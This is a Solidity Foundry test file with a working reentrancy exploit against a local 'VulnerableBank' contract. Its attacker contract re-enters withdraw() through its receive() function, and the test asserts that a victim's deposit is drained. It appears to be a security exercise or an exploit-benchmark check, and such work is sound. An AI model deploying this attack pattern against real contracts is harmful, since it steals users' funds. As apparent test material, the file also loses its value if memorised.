// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VulnerableBank} from "../src/ReentrancyVault.sol";

contract Attack {
    VulnerableBank private immutable bank;
    bool private reentered;

    constructor(VulnerableBank _bank) payable {
        bank = _bank;
    }

    receive() external payable {
        if (reentered) return;
        reentered = true;
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    function arm() external payable {
        bank.deposit{value: msg.value}();
    }

    function attack() external {
        reentered = false;
        bank.withdraw();
    }
}

contract ExploitTest is Test {
    function test_autonomous_exploit() public {
        VulnerableBank bank = new VulnerableBank();
        // Victim funds the vault so a replay steals someone else's ETH.
        address victim = address(0xBEEF);
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        bank.deposit{value: 1 ether}();

        Attack attacker = new Attack(bank);
        uint256 deposited = 1 ether;
        attacker.arm{value: deposited}();
        assertEq(address(bank).balance, 2 ether);

        attacker.attack();
        uint256 gain = address(attacker).balance - deposited;

        assertEq(address(bank).balance, 0);
        assertEq(gain, 1 ether);  // stole the victim's deposit
        emit log_named_uint("impact_gain", gain);
    }
}
